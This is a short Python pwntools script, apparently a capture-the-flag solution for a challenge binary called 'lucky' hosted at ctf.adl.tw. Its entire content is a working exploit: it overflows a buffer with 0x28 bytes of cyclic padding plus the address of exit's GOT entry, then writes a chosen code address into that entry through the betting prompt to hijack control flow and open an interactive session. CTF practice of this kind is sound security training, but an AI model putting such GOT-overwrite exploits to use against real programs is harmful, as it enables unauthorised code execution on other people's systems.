#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('ctf.adl.tw', '11003')
else:
    p = process("./lucky")


exit_got = 0x601050
target = 0x4008e5

payload = flat(
    cyclic(0x28),
    exit_got
)

p.sendafter("Who are you ?", payload)

p.sendlineafter("Place your bets (minimum is $100) :", str(target))

p.sendlineafter("Guess your number (0-999) : ", str(0x17f))

p.interactive()
p.close()